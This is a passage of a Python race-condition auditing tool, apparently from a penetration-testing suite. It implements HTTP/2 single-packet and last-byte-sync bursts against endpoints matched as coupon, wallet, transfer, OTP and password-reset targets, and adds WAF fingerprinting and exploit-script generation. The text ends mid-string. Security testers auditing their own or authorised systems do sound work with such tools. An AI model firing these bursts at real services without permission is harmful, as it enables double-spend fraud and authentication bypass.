#!/usr/bin/env python3
"""
auditing_tools/race_condition.py — Race Condition Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade TOCTOU / race-condition auditing.

TECHNIQUES IMPLEMENTED
──────────────────────
  1. HTTP/2 SINGLE-PACKET ATTACK (default when `h2` library available)
     Opens N streams on one TCP connection and sends all HEADERS+DATA
     frames in a single sendall(). This is the gold-standard technique —
     the server sees all N requests in one kernel-level packet, so the
     TOCTOU window is minimized to microseconds.

  2. HTTP/1.1 LAST-BYTE SYNC (default when TLS+raw socket is available)
     Opens N TCP connections, sends each request except for the last
     byte, then fires all N last-bytes in one tight loop. Defeats Nagle's
     algorithm and kernel scheduling so requests hit the server together.

  3. THREADED REQUESTS BURST (fallback)
     Python threading.Barrier + requests library. Compatible with every
     environment but the least precise (OS scheduler jitter ~1-5ms).

CONFIRMATION MODEL (no false positives)
───────────────────────────────────────
Step A — Baseline variance:
  Fire N SEQUENTIAL requests. Count successes (seq_success).
    • seq_success == 0     → token exhausted / payload wrong → can't test
    • seq_success == N     → endpoint has no single-use control → can't test
    • 1 <= seq_success < N → good baseline; continue to Step B

Step B — Learned signature:
  From the successful sequential requests, extract the winner signature
  (status, success_markers, failure_markers, length-bucket). This becomes
  the "confirmed success" shape used by Step C.

Step C — Concurrent burst:
  Fire N CONCURRENT requests via the chosen probe technique. Count how
  many responses match the learned signature (conc_success).

Step D — Multi-fidelity escalation (aggressive mode):
  If Step C doesn't confirm at N=5, retry at N=10, 20, 50. Some races
  only manifest at high concurrency.

CONFIRMATION RULE
─────────────────
  A finding is CONFIRMED only when:
      conc_success > seq_success      (concurrent beat sequential)
   AND conc_success >= 2                (at least one duplicate)
   AND conc_success / request_count > seq_success / request_count + margin

  This eliminates the "always-200 endpoint" false positive that v3
  produced constantly.

SEVERITY (impact-driven)
────────────────────────
  CRITICAL   Confirmed financial impact (double-spend, wallet, transfer),
             OR confirmed auth bypass (OTP/MFA race, password-reset race).
  HIGH       Confirmed single-use overrun on sensitive endpoint
             (invite/referral abuse, API-key generation, inventory).
  MEDIUM     Confirmed rate-limit bypass on login/OTP (brute-force pivot),
             OR confirmed vote/reaction limit bypass.
  LOW        Unconfirmed candidate with strong surface match.
  INFO       No race detected; single-use control working.

CHAINS (aggregated into race_chains.json)
─────────────────────────────────────────
  race-double-spend     financial impact proven
  race-auth-bypass      OTP / password-reset / MFA race proven
  race-limit-overrun    quota / single-use proven on sensitive endpoint
  race-rate-bypass      rate-limit absent (brute-force pivot)
  race-inventory        inventory oversell proven

OUTPUTS
───────
  race_findings.json        every candidate + probe result
  race_confirmed.json       HIGH / CRITICAL only (confirmed)
  race_chains.json          structured chain records
  race_candidates.txt       flat triage
  race_probe_results.txt    probe evidence
  race_attack_plans/        standalone exploit scripts per candidate:
                              • <id>_turbo.py       Turbo Intruder (Burp)
                              • <id>_single_packet.py   pure-Python h2
                              • <id>_lastbyte.sh    last-byte sync
                              • <id>_curl.sh        parallel curl loop
                              • <id>_requests.py    threading.Barrier
  race_evidence/            raw winner + loser bodies per confirmed finding
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.race_condition")

# Optional HTTP/2 dependency
try:
    import h2.connection as h2_connection
    import h2.config as h2_config
    import h2.events as h2_events
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _race_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("race", {}) or {}
    return {
        "rate_limit":  entry.get("rate_limit", 3),
        "concurrency": entry.get("concurrency", 10),
        "timeout":     entry.get("timeout", 12),
        "jitter":      entry.get("jitter", 0.3),
        "proxies":     entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION + EVASION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm"], "body": ["Attention Required! | Cloudflare"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed"], "body": ["Access Denied"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses"], "body": ["Pardon Our Interruption"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid"], "body": ["Request blocked"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"], "body": ["The requested URL was rejected"]},
    "Sucuri":      {"headers": ["x-sucuri-id"], "body": ["Sucuri WebSite Firewall"]},
    "DataDome":    {"headers": ["x-datadome"], "body": ["captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["ModSecurity"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


def detect_waf(session: "RateLimitedSession", url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.session.get(url, timeout=session.timeout, verify=False)
    except Exception:
        return report
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = (resp.text or "")[:4000].lower()
    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break
    if resp.status_code in (403, 406, 429, 503):
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT   = 12
DEFAULT_PROBE_N   = 20
BASELINE_N        = 10
MULTI_FIDELITY    = (5, 10, 20, 50)
PROBE_TIMEOUT     = 30
MAX_PROBES        = 100

SUCCESS_MARKERS = (
    "success", '"ok"', '"status":"ok"', '"applied"', '"redeemed"',
    '"created"', '"accepted"', '"completed"', '"confirmed"',
    '"valid":true', '"allowed":true', '"reused":false',
)
FAILURE_MARKERS = (
    '"error"', '"fail"', '"already"', '"used"', '"invalid"',
    '"expired"', '"denied"', '"rejected"', '"limit"', '"not found"',
    '"forbidden"', 'rate limit', 'too many requests', '"reused":true',
)

RACE_PATTERNS: list[tuple[str, str, str, str]] = [
    (r"(coupon|promo|voucher|discount|redeem)",
     "limit_overrun", "CRITICAL", "Coupon/voucher single-use redemption"),
    (r"(gift[-_]?card|giftcard|balance|wallet|credit)",
     "double_spend", "CRITICAL", "Gift card or wallet balance double-spend"),
    (r"(transfer|withdraw|payment|checkout|purchase)",
     "double_spend", "CRITICAL", "Financial transaction double-spend"),
    (r"(vote|upvote|downvote|like|reaction|rating)",
     "limit_overrun", "HIGH", "Vote/reaction limit bypass"),
    (r"(inventory|stock|quantity|add[-_]?to[-_]?cart)",
     "limit_overrun", "HIGH", "Inventory or stock limit bypass"),
    (r"(invite|invitation|referral|signup|register)",
     "limit_overrun", "HIGH", "Invitation or registration limit bypass"),
    (r"(password[-_]?reset|forgot[-_]?password|reset[-_]?token)",
     "multistep_bypass", "CRITICAL", "Password reset token race"),
    (r"(email[-_]?change|verify[-_]?email|confirm)",
     "multistep_bypass", "HIGH", "Email verification/change race"),
    (r"(otp|2fa|mfa|verification[-_]?code|sms[-_]?code)",
     "multistep_bypass", "CRITICAL", "OTP/MFA verification bypass"),
    (r"(login|signin|authenticate)",
     "rate_bypass", "MEDIUM", "Login rate-limit bypass"),
    (r"(api[-_]?key|token|secret|generate)",
     "limit_overrun", "HIGH", "API key or token generation limit bypass"),
]

STATE_PARAMS = {
    "action", "operation", "cmd", "do", "execute", "submit",
    "redeem", "apply", "transfer", "withdraw", "vote", "like",
    "confirm", "verify", "reset", "create", "delete", "update",
}
BODY_FIELD_PATTERNS = [
    "coupon_code", "voucher", "promo_code", "gift_card",
    "amount", "quantity", "price", "total", "balance",
    "token", "otp", "code", "verification", "invite",
    "vote", "like", "rating",
]

# Chain mapping
CHAIN_FOR_CLASS = {
    "double_spend":     "race-double-spend",
    "multistep_bypass": "race-auth-bypass",
    "limit_overrun":    "race-limit-overrun",
    "rate_bypass":      "race-rate-bypass",
}


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class RaceCandidate:
    target: str
    race_class: str
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    description: str = ""
    evidence: str = ""
    method: str = "POST"
    param_name: str = ""
    body_template: str = ""
    content_type: str = "application/x-www-form-urlencoded"
    expected_outcome: str = ""
    escalation: str = ""
    # Probe results
    seq_success: Optional[int] = None
    seq_total: Optional[int] = None
    conc_success: Optional[int] = None
    conc_total: Optional[int] = None
    probe_mode: str = ""
    probe_count_used: int = 0
    http_statuses: list[int] = field(default_factory=list)
    winner_signature: Optional[list] = None
    chain_ids: list[str] = field(default_factory=list)
    waf_vendor: str = ""
    details: dict = field(default_factory=dict)
    auth_enabled: bool = False
    first_seen: str = ""

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.race_class}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":             self.target,
            "target_host":        self.target_host,
            "race_class":         self.race_class,
            "severity":           self.severity.value,
            "confidence":         self.confidence,
            "confirmed":          self.confirmed,
            "description":        self.description[:1024],
            "evidence":           self.evidence[:1024],
            "method":             self.method,
            "param_name":         self.param_name,
            "expected_outcome":   self.expected_outcome,
            "escalation":         self.escalation,
            "seq_success":        self.seq_success,
            "seq_total":          self.seq_total,
            "conc_success":       self.conc_success,
            "conc_total":         self.conc_total,
            "probe_mode":         self.probe_mode,
            "probe_count_used":   self.probe_count_used,
            "http_statuses":      self.http_statuses,
            "winner_signature":   self.winner_signature,
            "chain_ids":          self.chain_ids,
            "waf_vendor":         self.waf_vendor,
            "details":            self.details,
            "auth_enabled":       self.auth_enabled,
            "finding_hash":       self.finding_hash,
            "first_seen":         self.first_seen or _db_now(),
        }


@dataclass
class RaceChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "chain_id":       self.chain_id,
            "name":           self.name,
            "severity":       self.severity.value,
            "steps":          self.steps,
            "finding_hashes": self.finding_hashes,
            "evidence":       self.evidence[:600],
        }


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  RATE-LIMITED SESSION (thread-safe)
# ═════════════════════════════════════════════════════════════════════════════

class RateLimitedSession:
    def __init__(self, rate_limit: int = 3, timeout: int = DEFAULT_TIMEOUT):
        self.session = requests.Session()
        self.session.verify = False
        hdrs = _target_headers()
        if hdrs:
            self.session.headers.update(hdrs)
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self.timeout = timeout
        self._last = 0.0
        self._lock = threading.Lock()
        self._burst_mode = False

    def set_burst_mode(self, on: bool) -> None:
        self._burst_mode = on

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        if self.min_interval > 0 and not self._burst_mode:
            with self._lock:
                elapsed = time.monotonic() - self._last
                if elapsed < self.min_interval:
                    time.sleep(self.min_interval - elapsed)
                self._last = time.monotonic()
        try:
            return self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _load_race_config(outdir: Path) -> dict:
    """Load per-target race configuration (method, body, markers)."""
    cfg_file = outdir / "race_config.json"
    if not cfg_file.exists():
        return {}
    try:
        return json.loads(cfg_file.read_text())
    except Exception:
        return {}


def _match_race_patterns(url: str) -> list[tuple[str, str, str, str]]:
    combined = url.lower()
    return [
        (pattern, race_class, severity, description)
        for pattern, race_class, severity, description in RACE_PATTERNS
        if re.search(pattern, combined, re.I)
    ]


def _infer_method(url: str, params: dict) -> str:
    if set(params.keys()) & STATE_PARAMS:
        return "POST"
    path = urllib.parse.urlparse(url).path.lower()
    if any(kw in path for kw in ("redeem", "transfer", "create", "update", "delete", "apply")):
        return "POST"
    return "GET"


def _infer_param(params: dict) -> str:
    for k in params:
        if k.lower() in STATE_PARAMS:
            return k
    for k in params:
        if any(fp in k.lower() for fp in BODY_FIELD_PATTERNS):
            return k
    return next(iter(params), "")


def _escalation_for_class(race_class: str) -> str:
    return {
        "limit_overrun":    "Multiple applications → financial loss or reputation inflation",
        "double_spend":     "Multiple successful transactions → direct monetary loss",
        "multistep_bypass": "Multiple valid tokens issued → account takeover",
        "rate_bypass":      "Rate limit bypass → credential stuffing / OTP brute-force",
    }.get(race_class, "Business logic bypass")


def _expected_outcome(race_class: str) -> str:
    return {
        "limit_overrun":    "Exactly 1 success; >1 = limit overrun",
        "double_spend":     "Balance debited once; >1 success = double-spend",
        "multistep_bypass": "Exactly 1 valid token; >1 = token race",
        "rate_bypass":      "Rate limit enforced after N; bypass if all succeed",
    }.get(race_class, "Single success expected")


def _body_signature(status: int, body: str) -> tuple:
    """(status, has_success, has_failure, length_bucket)."""
    low = (body or "").lower()[:5000]
    has_succ = any(m in low for m in SUCCESS_MARKERS)
    has_fail = any(m in low for m in FAILURE_MARKERS)
    return (status, has_succ, has_fail, len(low) // 50)


def _is_success_sig(sig: tuple) -> bool:
    status, succ, fail, _ = sig
    if not (200 <= status < 300):
        return False
    if fail and not succ:
        return False
    return True


def _build_request_bytes(
    method: str, url: str,
    headers: dict, body: bytes,
) -> bytes:
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    lines = [f"{method} {path} HTTP/1.1", f"Host: {parsed.netloc}"]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def _parse_http1_response(raw: bytes) -> tuple[int, str]:
    """Return (status_code, body_text) from a raw HTTP/1.1 response."""
    try:
        head, _, body = raw.partition(b"\r\n\r\n")
        first_line = head.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
        parts = first_line.split(" ")
        status = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        # Handle chunked encoding
        if b"transfer-encoding: chunked" in head.lower():
            body = _dechunk(body)
        return status, body.decode("utf-8", errors="replace")
    except Exception:
        return 0, ""


def _dechunk(raw: bytes) -> bytes:
    out = b""
    while raw:
        line_end = raw.find(b"\r\n")
        if line_end < 0:
            break
        try:
            size = int(raw[:line_end].split(b";")[0], 16)
        except ValueError:
            break
        if size == 0:
            break
        chunk = raw[line_end + 2: line_end + 2 + size]
        out += chunk
        raw = raw[line_end + 2 + size + 2:]
    return out


def _build_curl(
    method: str, url: str, headers: Optional[dict] = None,
    body: bytes = b"",
) -> str:
    parts = [f"curl -X {method} '{url}'"]
    if headers:
        for k, v in headers.items():
            if k.lower() in ("cookie", "authorization"):
                parts.append(f"-H '{k}: {v[:20]}...'")
            else:
                parts.append(f"-H '{k}: {v}'")
    if body:
        parts.append(f"-d '{body.decode('utf-8', errors='replace')[:300]}'")
    return " ".join(parts)


# ═════════════════════════════════════════════════════════════════════════════
#  PROBE ENGINE — THREE IMPLEMENTATIONS
# ═════════════════════════════════════════════════════════════════════════════

class ProbeBase:
    name = "base"

    def __init__(self, session: RateLimitedSession, timeout: int = DEFAULT_TIMEOUT):
        self.session = session
        self.timeout = timeout

    def probe(
        self, candidate: RaceCandidate, headers: dict, count: int,
    ) -> list[tuple[int, str]]:
        raise NotImplementedError


class RequestsProbe(ProbeBase):
    """Threaded requests burst — universal fallback."""
    name = "requests"

    def probe(self, candidate, headers, count):
        results: list[tuple[int, str]] = [(0, "")] * count
        barrier = threading.Barrier(count)

        def worker(idx: int) -> None:
            try:
                barrier.wait(timeout=10)
            except threading.BrokenBarrierError:
                return
            try:
                if candidate.method in ("POST", "PUT", "PATCH"):
                    r = self.session.session.request(
                        candidate.method, candidate.target,
                        headers={**headers, "Content-Type": candidate.content_type},
                        data=candidate.body_template,
                        timeout=self.timeout, allow_redirects=False, verify=False,
                    )
                else:
                    r = self.session.session.request(
                        candidate.method, candidate.target,
                        headers=headers,
                        timeout=self.timeout, allow_redirects=False, verify=False,
                    )
                results[idx] = (r.status_code, r.text or "")
            except Exception:
                results[idx] = (0, "")

        # Bypass rate limiter (barrier is the coordination mechanism)
        self.session.set_burst_mode(True)
        try:
            threads = [
                threading.Thread(target=worker, args=(i,), daemon=True)
                for i in range(count)
            ]
            for t in threads: t.start()
            for t in threads: t.join(timeout=PROBE_TIMEOUT)
        finally:
            self.session.set_burst_mode(False)
        return results


class LastByteSyncProbe(ProbeBase):
    """HTTP/1.1 last-byte sync via raw sockets — precise for HTTP/1.1."""
    name = "lastbyte"

    def probe(self, candidate, headers, count):
        parsed = urllib.parse.urlparse(candidate.target)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        is_tls = parsed.scheme == "https"

        body = candidate.body_template.encode() if candidate.body_template else b""
        req_headers = {
            **{k: v for k, v in headers.items() if k.lower() not in ("host", "content-length")},
            "Connection": "close",
        }
        if body:
            req_headers["Content-Type"] = candidate.content_type
            req_headers["Content-Length"] = str(len(body))

        request = _build_request_bytes(candidate.method, candidate.target, req_headers, body)

        ctx = None
        if is_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        sockets: list[tuple[socket.socket, bytes]] = []
        for _ in range(count):
            try:
                s = socket.create_connection((host, port), timeout=self.timeout)
                if is_tls:
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.sendall(request[:-1])
                sockets.append((s, request[-1:]))
            except Exception as e:
                log.debug(f"lastbyte connect fail: {e}")
                break

        if not sockets:
            return [(0, "")] * count

        # Fire last bytes as fast as possible
        t0 = time.monotonic()
        for s, last in sockets:
            try:
                s.send(last)
            except Exception:
                pass
        elapsed = (time.monotonic() - t0) * 1000
        log.debug(f"lastbyte: fired {len(sockets)} last-bytes in {elapsed:.1f}ms")

        # Read responses
        results = []
        for s, _ in sockets:
            try:
                s.settimeout(self.timeout)
                raw = b""
                while True:
                    chunk = s.recv(65535)
                    if not chunk:
                        break
                    raw += chunk
                    if b"\r\n\r\n" in raw and b"Content-Length:" in raw:
                        # Could stop here on non-chunked; but keep reading for safety
                        pass
                status, text = _parse_http1_response(raw)
                results.append((status, text))
            except Exception:
                results.append((0, ""))
            finally:
                try: s.close()
                except Exception: pass

        # Pad to count if some sockets failed
        while len(results) < count:
            results.append((0, ""))
        return results


class SinglePacketProbe(ProbeBase):
    """HTTP/2 single-packet attack via h2 library — precise when available."""
    name = "singlepacket"

    def probe(self, candidate, headers, count):
        if not H2_AVAILABLE:
            return [(0, "")] * count

        parsed = urllib.parse.urlparse(candidate.target)
        host = parsed.hostname or ""
        port = parsed.port or 443
        path = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
        body = candidate.body_template.encode() if candidate.body_template else b""

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        try:
            raw = socket.create_connection((host, port), timeout=self.timeout)
            sock = ctx.wrap_socket(raw, server_hostname=host)
            if sock.selected_alpn_protocol() != "h2":
                log.debug("singlepacket: server did not negotiate h2")
                try: sock.close()
                except Exception: pass
                return [(0, "")] * count
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception as e:
            log.debug(f"singlepacket connect fail: {e}")
            return [(0, "")] * count

        try:
            conn = h2_connection.H2Connection(config=h2_config.H2Configuration(client_side=True))
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # Read server SETTINGS to respect max_concurrent_streams
            sock.settimeout(5)
            try:
                data = sock.recv(65535)
                conn.receive_data(data)
                sock.sendall(conn.data_to_send())
            except socket.timeout:
                pass

            # Build all streams
            req_headers_base = {
                **{k.lower(): v for k, v in headers.items() if k.lower() not in ("host", "content-length")},
            }
            if body:
                req_headers_base["content-type"] = candidate.content_type
                req_headers_base["content-length"] = str(len(body))

            stream_ids: list[int] = []
            for i in range(count):
                stream_id = 2 * i + 1
                stream_ids.append(stream_id)
                hdrs = [
                    (":method", candidate.method),
                    (":authority", host),
                    (":scheme", "https"),
                    (":path", path),
                ] + [(k, v) for k, v in req_headers_base.items()]
                conn.send_headers(stream_id, hdrs, end_stream=False)
                if body:
                    conn.send_data(stream_id, body, end_stream=True)
                else:
                    conn.end_stream(stream_id)

            # ALL requests in ONE sendall() — this IS the single-packet attack
            sock.sendall(conn.data_to_send())

            responses = {sid: {"status": 0, "body": ""} for sid in stream_ids}
            pending = set(stream_ids)
            sock.settimeout(self.timeout)
            deadline = time.monotonic() + self.timeout + 5

            while pending and time.monotonic() < deadline:
                try:
                    data = sock.recv(65535)
                except socket.timeout:
                    break
                if not data:
                    break
                try:
                    events = conn.receive_data(data)
                except Exception:
                    break
                for ev in events:
                    if isinstance(ev, h2_events.ResponseReceived):
                        for k, v in ev.headers:
                            if k == ":status":
                                responses[ev.stream_id]["status"] = int(v)
                    elif isinstance(ev, h2_events.DataReceived):
                        responses[ev.stream_id]["body"] += ev.data.decode("utf-8", errors="replace")
                        try:
                            conn.acknowledge_received_data(
                                ev.flow_controlled_length, ev.stream_id,
                            )
                        except Exception:
                            pass
                    elif isinstance(ev, h2_events.StreamEnded):
                        pending.discard(ev.stream_id)
                out = conn.data_to_send()
                if out:
                    try: sock.sendall(out)
                    except Exception: pass

            sock.close()
            return [
                (responses[sid]["status"], responses[sid]["body"])
                for sid in stream_ids
            ]
        except Exception as e:
            log.debug(f"singlepacket probe error: {e}")
            try: sock.close()
            except Exception: pass
            return [(0, "")] * count


def choose_probe(
    session: RateLimitedSession,
    candidate: RaceCandidate,
    mode: str,
    timeout: int,
) -> ProbeBase:
    """Pick the best probe for this candidate based on mode + availability."""
    scheme = urllib.parse.urlparse(candidate.target).scheme

    if mode == "requests":
        return RequestsProbe(session, timeout)
    if mode == "lastbyte":
        return LastByteSyncProbe(session, timeout)
    if mode == "singlepacket":
        if scheme == "https" and H2_AVAILABLE:
            return SinglePacketProbe(session, timeout)
        log.debug("singlepacket unavailable (need https + h2) → falling back")
        return LastByteSyncProbe(session, timeout)

    # mode == "auto"
    if scheme == "https" and H2_AVAILABLE:
        return SinglePacketProbe(session, timeout)
    return LastByteSyncProbe(session, timeout)


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE VARIANCE + LEARNED SIGNATURE
# ═════════════════════════════════════════════════════════════════════════════

def measure_baseline(
    session: RateLimitedSession,
    candidate: RaceCandidate,
    headers: dict,
    n: int,
) -> tuple[int, list[tuple[int, str]]]:
    """
    Fire N SEQUENTIAL requests to establish the endpoint's natural
    single-use behaviour. Returns (success_count, all_responses).

    Rate limiter is ACTIVE here — we want realistic sequential behaviour.
    """
    session.set_burst_mode(False)
    responses: list[tuple[int, str]] = []
    successes = 0

    for _ in range(n):
        try:
            if candidate.method in ("POST", "PUT", "PATCH"):
                r = session.session.request(
                    candidate.method, candidate.target,
                    headers={**headers, "Content-Type": candidate.content_type},
                    data=candidate.body_template,
                    timeout=session.timeout, allow_redirects=False, verify=False,
                )
            else:
                r = session.session.request(
                    candidate.method, candidate.target,
                    headers=headers,
                    timeout=session.timeout, allow_redirects=False, verify=False,
                )
            responses.append((r.status_code, r.text or ""))
            if _is_success_sig(_body_signature(r.status_code, r.text or "")):
                successes += 1
        except Exception as e:
            log.debug(f"baseline req fail: {e}")
            responses.append((0, ""))
        # Small pause between sequential requests (avoid triggering WAF)
        time.sleep(0.15)

    return successes, responses


def learn_signature(responses: list[tuple[int, str]]) -> Optional[tuple]:
    """Extract the success-shape from the baseline responses."""
    sigs = [_body_signature(s, b) for s, b in responses if _is_success_sig(_body_signature(s, b))]
    if not sigs:
        return None
    counts: dict[tuple, int] = {}
    for sig in sigs:
        counts[sig] = counts.get(sig, 0) + 1
    return max(counts.items(), key=lambda kv: kv[1])[0]


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIRMATION LOGIC
# ═════════════════════════════════════════════════════════════════════════════

def _evaluate(
    candidate: RaceCandidate,
    seq_success: int, seq_total: int,
    conc_results: list[tuple[int, str]],
    learned_sig: Optional[tuple],
) -> None:
    """Populate candidate.confirmed / severity / confidence / evidence."""
    conc_total = len(conc_results)
    conc_sigs = [_body_signature(s, b) for s, b in conc_results if s > 0]
    if not conc_sigs:
        candidate.evidence = (
            f"Concurrent burst produced 0 responses (n={conc_total}) — "
            f"network error or timeout on all threads"
        )
        candidate.severity = Severity.INFO
        candidate.confidence = 0
        candidate.confirmed = False
        return

    # Count responses matching the learned signature (fall back to any success)
    def _matches(sig: tuple) -> bool:
        if learned_sig and sig[0] == learned_sig[0] and sig[1] == learned_sig[1] and sig[2] == learned_sig[2]:
            return True
        return _is_success_sig(sig) and not (learned_sig is None and sig[2] and not sig[1])

    winner_sigs = [s for s in conc_sigs if _matches(s)]
    conc_success = len(winner_sigs)

    candidate.seq_success = seq_success
    candidate.seq_total = seq_total
    candidate.conc_success = conc_success
    candidate.conc_total = conc_total
    candidate.http_statuses = [s[0] for s in conc_sigs]
    candidate.winner_signature = list(learned_sig) if learned_sig else None

    # Rate-limit bypass has its own logic
    if candidate.race_class == "rate_bypass":
        if conc_success == conc_total and conc_total > 0:
            candidate.severity = Severity.MEDIUM
            candidate.confidence = 70
            candidate.confirmed = False  # informational (no bypass shown)
            candidate.evidence = (
                f"All {conc_success}/{conc_total} concurrent requests succeeded — "
                f"endpoint lacks rate-limiting (brute-force pivot). "
                f"Informational; not a race condition."
            )
            candidate.chain_ids = ["race-rate-bypass"]
        else:
            candidate.severity = Severity.INFO
            candidate.confidence = 40
            candidate.evidence = (
                f"{conc_success}/{conc_total} concurrent requests succeeded — "
                f"rate limit appears enforced"
            )
        return

    # Baseline check — no single-use control = can't test
    if seq_success == 0:
        candidate.severity = Severity.INFO
        candidate.confidence = 20
        candidate.confirmed = False
        candidate.evidence = (
            f"Baseline: 0/{seq_total} sequential requests succeeded. "
            f"Token likely exhausted or payload wrong. Cannot test — supply "
            f"a fresh token / correct body via race_config.json."
        )
        return
    if seq_success >= seq_total:
        candidate.severity = Severity.INFO
        candidate.confidence = 25
        candidate.confirmed = False
        candidate.evidence = (
            f"Baseline: {seq_success}/{seq_total} sequential requests ALL "
            f"succeeded — endpoint has no single-use control. Not testable."
        )
        return

    # The real test: concurrent must beat sequential by a margin
    seq_rate = seq_success / seq_total
    conc_rate = conc_success / conc_total if conc_total else 0.0
    margin = conc_rate - seq_rate

    if conc_success >= 2 and margin > 0.2:
        candidate.confirmed = True
        candidate.confidence = 90 if conc_success >= 3 else 78
        candidate.severity = _severity_for(candidate.race_class, confirmed=True)
        candidate.evidence = (
            f"CONFIRMED: {conc_success}/{conc_total} concurrent requests "
            f"matched success signature (baseline sequential: "
            f"{seq_success}/{seq_total}). Concurrent rate {conc_rate*100:.0f}% "
